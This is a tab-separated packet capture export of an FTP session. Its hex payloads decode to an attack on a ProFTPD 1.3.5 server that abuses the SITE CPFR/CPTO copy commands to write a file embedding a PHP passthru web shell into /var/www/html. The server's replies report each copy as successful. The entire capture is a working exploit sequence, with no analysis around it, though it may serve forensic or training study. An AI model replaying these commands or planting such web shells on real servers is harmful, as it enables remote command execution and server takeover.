frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	tcp.payload
4	192.168.2.2	21	192.168.1.3	36273	3232302050726f4654504420312e332e3520536572766572202850726f465450442044656661756c7420496e7374616c6c6174696f6e29205b3139322e3136382e322e325d0d0a
6	192.168.1.3	36273	192.168.2.2	21	534954452043504652202f70726f632f73656c662f636d646c696e650d0a
8	192.168.2.2	21	192.168.1.3	36273	3335302046696c65206f72206469726563746f7279206578697374732c20726561647920666f722064657374696e6174696f6e206e616d650d0a
10	192.168.1.3	36273	192.168.2.2	21	53495445204350544f202f746d702f2e3c3f70687020706173737468727528245f4745545b276843575651275d293b3f3e0d0a
11	192.168.2.2	21	192.168.1.3	36273	32353020436f7079207375636365737366756c0d0a
13	192.168.1.3	36273	192.168.2.2	21	534954452043504652202f746d702f2e3c3f70687020706173737468727528245f4745545b276843575651275d293b3f3e0d0a
14	192.168.2.2	21	192.168.1.3	36273	3335302046696c65206f72206469726563746f7279206578697374732c20726561647920666f722064657374696e6174696f6e206e616d650d0a
15	192.168.1.3	36273	192.168.2.2	21	53495445204350544f202f7661722f7777772f68746d6c2f3651666f466d4a2e7068700d0a
16	192.168.2.2	21	192.168.1.3	36273	32353020436f7079207375636365737366756c0d0a
